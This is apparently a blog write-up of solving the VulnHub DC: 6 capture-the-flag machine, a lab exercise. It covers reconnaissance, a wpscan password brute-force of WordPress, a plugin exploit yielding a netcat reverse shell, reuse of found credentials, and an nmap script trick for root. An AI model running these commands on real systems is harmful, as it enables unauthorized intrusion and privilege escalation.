@@ -1,0 +1,228 @@
+I"�A<p><strong>DC: 6</strong> is a challenge posted on <a href="https://www.vulnhub.com/entry/dc-6,315/">VulnHub</a> created by <a href="https://www.vulnhub.com/author/dcau,610/">DCAU</a>. This is a write-up of my experience solving this awesome CTF challenge.</p>
+
+<p>With my Attack Machine (<strong>Kali Linux</strong>) and Victim Machine (<strong>DC: 6</strong>) set up and running, I decided to get down to solving this challenge.</p>
+
+<blockquote>
+  <p>Read more about my set up and environment <a href="https://diaryof0x41.wordpress.com/2019/05/25/entry-0x01-my-first-post/">here</a></p>
+</blockquote>
+
+<p>I decided to start my journey with <code class="language-plaintext highlighter-rouge">netdiscover</code> to complete the <em>host discovery</em> phase as follows: <code class="language-plaintext highlighter-rouge">netdiscover -r 192.168.56.0/24</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-3.47.31-pm.png" alt="Screen Shot 2019-05-29 at 3.47.31 PM.png" /></p>
+
+<p>Great, the Victim Machine is <code class="language-plaintext highlighter-rouge">192.168.56.103</code>. Let’s continue!</p>
+
+<p>For the next step, I decided to run an <code class="language-plaintext highlighter-rouge">nmap</code> scan to determine open ports and services using the command: <code class="language-plaintext highlighter-rouge">nmap -sV -F 192.168.56.103</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-3.49.55-pm.png" alt="Screen Shot 2019-05-29 at 3.49.55 PM.png" /></p>
+
+<p>A <em>fast</em> scan revealed that ports - <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code> were open. Let’s hit the browser!</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-4.01.06-pm.png" alt="Screen Shot 2019-05-29 at 4.01.06 PM.png" /></p>
+
+<p>All I did was navigate to <code class="language-plaintext highlighter-rouge">http://192.168.56.103</code> but it immediately re-directed me to <code class="language-plaintext highlighter-rouge">http://wordy</code>.</p>
+
+<p>Not a problem… I just need to edit my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file. I decided to use <code class="language-plaintext highlighter-rouge">vim</code> (still figuring out how to exit) with the command: <code class="language-plaintext highlighter-rouge">vim /etc/hosts</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-4.16.59-pm.png" alt="Screen Shot 2019-05-29 at 4.16.59 PM" /></p>
+
+<p>Back to the browser!</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-4.18.07-pm.png" alt="Screen Shot 2019-05-29 at 4.18.07 PM.png" /></p>
+
+<p>Awesome, we got <code class="language-plaintext highlighter-rouge">Wordy - Just another WordPress site</code>.</p>
+
+<p>I decided to start my exploration with <code class="language-plaintext highlighter-rouge">nikto</code> - a trusty tool to tell me a bit about the website and its backend using the command: <code class="language-plaintext highlighter-rouge">nikto -h http://wordy</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-4.31.04-pm.png" alt="Screen Shot 2019-05-29 at 4.31.04 PM.png" /></p>
+
+<p>Perfect, we can confirm that it is a WordPress website. Time to fire up <code class="language-plaintext highlighter-rouge">wpscan</code>!</p>
+
+<p><code class="language-plaintext highlighter-rouge">wpscan</code> is the <em>de-facto</em> tool for any WordPress website. I decided to launch it to test for vulnerabilities and enumerate as much information as possible with the following command: <code class="language-plaintext highlighter-rouge">wpscan --url http://wordy --enumerate</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-8.31.14-pm.png" alt="Screen Shot 2019-05-29 at 8.31.14 PM.png" /></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-8.31.54-pm.png" alt="Screen Shot 2019-05-29 at 8.31.54 PM" /></p>
+
+<p>Wow! I found 2 interesting points from the results of <code class="language-plaintext highlighter-rouge">wpscan</code>:</p>
+
+<ol>
+  <li>WordPress version - 5.1.1</li>
+  <li>Identified users - <code class="language-plaintext highlighter-rouge">admin, sarah, graham, mark, jens</code></li>
+</ol>
+
+<p>So far we have access to the WordPress UI and a list of usernames. What next?</p>
+
+<p>I decided to explore the possibility of breaking in as a user. So, I navigated to <code class="language-plaintext highlighter-rouge">http://wordy/wp-login.php</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-8.43.30-pm.png" alt="Screen Shot 2019-05-29 at 8.43.30 PM.png" /></p>
+
+<p>A pretty normal-looking WordPress login screen. Okay, time to brute-force!</p>
+
+<p>But wait… there’s a <strong>clue</strong> from the creator (@DCAU)…</p>
+
+<blockquote>
+  <p>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
+
+  <table>
+    <tbody>
+      <tr>
+        <td>cat /usr/share/wordlists/rockyou.txt</td>
+        <td>grep k01 &gt; passwords.txt That should save you a few years. ;-)</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<p>You’re the man (or woman), @DCAU!</p>
+
+<p>Basically, the next step was to <em>brute-force</em> the login to WordPress. To do this, I planned to use <code class="language-plaintext highlighter-rouge">wpscan</code> itself with the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist. But, with @DCAU’s advice, I decided to run that Linux command first.</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-9.16.32-pm.png" alt="Screen Shot 2019-05-29 at 9.16.32 PM" /></p>
+
+<p>This is pretty significant because the <code class="language-plaintext highlighter-rouge">rockyou.txt</code> wordlist has 14344392 words. The fact that we reduced it to 2668 words is a huge time-saver.</p>
+
+<p>Back to <code class="language-plaintext highlighter-rouge">wpscan</code> for a brute-force attempt. I ran it using the command: <code class="language-plaintext highlighter-rouge">wpscan --url http://wordy -U admin -P passwords.txt</code></p>
+
+<p>This never gave me any matches. Then, it hit me that we have a total of <strong>5</strong> identified users according to <code class="language-plaintext highlighter-rouge">wpscan</code>. With this knowledge, I changed my command to: <code class="language-plaintext highlighter-rouge">wpscan --url http://wordy -U admin,sarah,mark,jens -P passwords.txt</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-9.26.54-pm.png" alt="Screen Shot 2019-05-29 at 9.26.54 PM" /></p>
+
+<p>Boom! We got a hit…</p>
+
+<ul>
+  <li>Username: <code class="language-plaintext highlighter-rouge">mark</code></li>
+  <li>Password: <code class="language-plaintext highlighter-rouge">helpdesk01</code></li>
+</ul>
+
+<p>Almost immediately, I tried to log in to the WordPress UI as <code class="language-plaintext highlighter-rouge">mark</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-9.28.42-pm.png" alt="Screen Shot 2019-05-29 at 9.28.42 PM" /></p>
+
+<p>Well hello, I am <code class="language-plaintext highlighter-rouge">Mark Jones</code>!</p>
+
+<p>One thing that I usually keep in mind is that most users re-use passwords. I wondered… would <code class="language-plaintext highlighter-rouge">Mark Jones</code> re-use his password for SSH? Only one way to find out!</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-9.32.14-pm.png" alt="Screen Shot 2019-05-29 at 9.32.14 PM" /></p>
+
+<p>Back to the browser…</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-10.42.13-pm.png" alt="Screen Shot 2019-05-29 at 10.42.13 PM.png" /></p>
+
+<p>One of the first things that I observed was the plugin - <strong>Activity monitor</strong>. Plugins on WordPress are infamous for being vulnerable. I decided to do some research about this plugin.</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-10.45.53-pm.png" alt="Screen Shot 2019-05-29 at 10.45.53 PM" /></p>
+
+<p>I found that there is a vulnerability (and exploit) available for this plugin on ExploitDB. To confirm this, I used my favorite tool - <code class="language-plaintext highlighter-rouge">searchsploit</code> as follows: <code class="language-plaintext highlighter-rouge">searchsploit wordpress activity monitor</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-10.48.03-pm.png" alt="Screen Shot 2019-05-29 at 10.48.03 PM.png" /></p>
+
+<p>Awesome! We have the exploit on Kali Linux (our Attack Machine). To use it, I decided to take a note of the ID number - <code class="language-plaintext highlighter-rouge">45274</code> mentioned in the file name. I proceeded with the command: <code class="language-plaintext highlighter-rouge">searchsploit -m 45274</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-10.50.22-pm.png" alt="Screen Shot 2019-05-29 at 10.50.22 PM.png" /></p>
+
+<p>Simply put, this command copies the exploit to our current directory. Time to use it!</p>
+
+<p>First things first, I decided to check the exploit and configure it (if required). To do this, I used my trusty <code class="language-plaintext highlighter-rouge">vim</code> text editor:</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-10.54.57-pm.png" alt="Screen Shot 2019-05-29 at 10.54.57 PM.png" /></p>
+
+<p>Cool, there are proper instructions on how to use it. I made 3 changes:</p>
+
+<ol>
+  <li>I changed <code class="language-plaintext highlighter-rouge">http://localhost:8000</code> to <code class="language-plaintext highlighter-rouge">http://wordy</code></li>
+  <li>I changed <code class="language-plaintext highlighter-rouge">127.0.0.1</code> to my IP address - <code class="language-plaintext highlighter-rouge">192.168.56.102</code></li>
+  <li>I removed the arguments <code class="language-plaintext highlighter-rouge">-nlvp</code> (I decided to run the listener on my Attack Machine - reverse shell technique)</li>
+</ol>
+
+<p>After saving the changes, I opened the <code class="language-plaintext highlighter-rouge">.HTML</code> file on my browser:</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-11.01.07-pm.png" alt="Screen Shot 2019-05-29 at 11.01.07 PM.png" /></p>
+
+<p>Simple and straightforward - a button called <strong>Submit request</strong>. While I was tempted to click it, I realized that I needed to first run the listener on my terminal.</p>
+
+<p>A reverse shell is easily setup using the trusty netcat: <code class="language-plaintext highlighter-rouge">nc -lvp 9999</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-11.05.46-pm.png" alt="Screen Shot 2019-05-29 at 11.05.46 PM" /></p>
+
+<p>Time to click the <strong>Submit request</strong> button and stare at netcat:</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-29-at-11.08.27-pm.png" alt="Screen Shot 2019-05-29 at 11.08.27 PM" /></p>
+
+<p>Yeah! We got shell!</p>
+
+<p>I checked my user and it was <code class="language-plaintext highlighter-rouge">www-data</code> (as expected). I decided to explore and figure out a way to escalate my privileges to <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>Based on our previous efforts, we are aware that there are 4 other users on WordPress apart from <code class="language-plaintext highlighter-rouge">admin</code>. I decided to check if these users exist on the box in the <code class="language-plaintext highlighter-rouge">/home</code> directory:</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.08.29-am.png" alt="Screen Shot 2019-05-30 at 11.08.29 AM.png" /></p>
+
+<p>They did! I wonder what <em>hidden treasures</em> exist in each directory…</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.09.37-am.png" alt="Screen Shot 2019-05-30 at 11.09.37 AM" /></p>
+
+<p>Oh look, <code class="language-plaintext highlighter-rouge">mark</code> has an interesting directory called <code class="language-plaintext highlighter-rouge">stuff</code>. Let’s look inside…</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.13.01-am.png" alt="Screen Shot 2019-05-30 at 11.13.01 AM.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">things-to-do.txt</code> looks interesting. What are its contents? Only one way to find out…</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.14.08-am.png" alt="Screen Shot 2019-05-30 at 11.14.08 AM.png" /></p>
+
+<p>Woah! We hit something - <code class="language-plaintext highlighter-rouge">graham</code> and <code class="language-plaintext highlighter-rouge">GSo7isUM1D4</code>. Could it be that this is the username and password for SSH? I decided to exit from the shell and give it a shot as follows: <code class="language-plaintext highlighter-rouge">ssh graham@wordy</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.18.08-am.png" alt="Screen Shot 2019-05-30 at 11.18.08 AM.png" /></p>
+
+<p>Jackpot!</p>
+
+<p>Still, I was adamant to further escalate my privileges on this box.</p>
+
+<p>I started with checking out my <code class="language-plaintext highlighter-rouge">sudo</code> as <code class="language-plaintext highlighter-rouge">graham</code> using the command: <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.22.27-am.png" alt="Screen Shot 2019-05-30 at 11.22.27 AM.png" /></p>
+
+<p>Interesting. We can run the Bash script - <code class="language-plaintext highlighter-rouge">/home/jens/backups.sh</code> as the user <code class="language-plaintext highlighter-rouge">jens</code></p>
+
+<p>But first, I decided to take a look at the script and check out its commands as follows: <code class="language-plaintext highlighter-rouge">cat /home/jens/backups.sh</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.28.30-am.png" alt="Screen Shot 2019-05-30 at 11.28.30 AM.png" /></p>
+
+<p>Woah! Line number 3… <code class="language-plaintext highlighter-rouge">/bin/bash</code> means that it opens a shell. To put it all into perspective, if we run <code class="language-plaintext highlighter-rouge">/home/jens/backups.sh</code> as the user <code class="language-plaintext highlighter-rouge">jens</code>, then it opens a shell and we will be user <code class="language-plaintext highlighter-rouge">jens</code>.</p>
+
+<p>I decided to run the script as follows: <code class="language-plaintext highlighter-rouge">sudo -u jens /home/jens/backups.sh</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.31.04-am.png" alt="Screen Shot 2019-05-30 at 11.31.04 AM.png" /></p>
+
+<p>Yeah! Time to check my <code class="language-plaintext highlighter-rouge">sudo</code> privileges as <code class="language-plaintext highlighter-rouge">jens</code> using the command: <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.34.27-am.png" alt="Screen Shot 2019-05-30 at 11.34.27 AM" /></p>
+
+<p>Nmap! <code class="language-plaintext highlighter-rouge">jens</code> can run <code class="language-plaintext highlighter-rouge">/usr/bin/nmap</code>  as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p>This is our shot at privilege escalation to <code class="language-plaintext highlighter-rouge">root</code> because of known techniques which exist for <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p>I came across <a href="https://gtfobins.github.io/gtfobins/nmap/">this webpage</a> which details how to achieve a shell using <code class="language-plaintext highlighter-rouge">nmap</code>. The code to achieve this is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TF=$(mktemp)
+echo 'os.execute("/bin/sh")' &gt; $TF
+nmap --script=$TF
+</code></pre></div></div>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.52.04-am.png" alt="Screen Shot 2019-05-30 at 11.52.04 AM.png" /></p>
+
+<p>Woohoo! we got <code class="language-plaintext highlighter-rouge">root</code>!</p>
+
+<p>Time to <em>capture the flag</em>…</p>
+
+<p><img src="/assets/images/screen-shot-2019-05-30-at-11.54.10-am.png" alt="Screen Shot 2019-05-30 at 11.54.10 AM.png" /></p>
+
+<p>Finally! We did it!</p>
+
+<h3 id="my-thoughts">My Thoughts</h3>
+
+<p>Such an awesome challenge. Huge props to @DCAU for creating an interesting challenge revolving around WordPress!</p>
+
+<p>In my opinion, <strong>DC: 6</strong> provided me a huge opportunity to practice my Linux skills especially the <em>privilege escalation</em> parts.</p>
+
+<p>I look forward to solving and writing-up the rest of challenges in the <a href="https://www.vulnhub.com/series/dc,199/">DC series</a>!</p>
+:ET
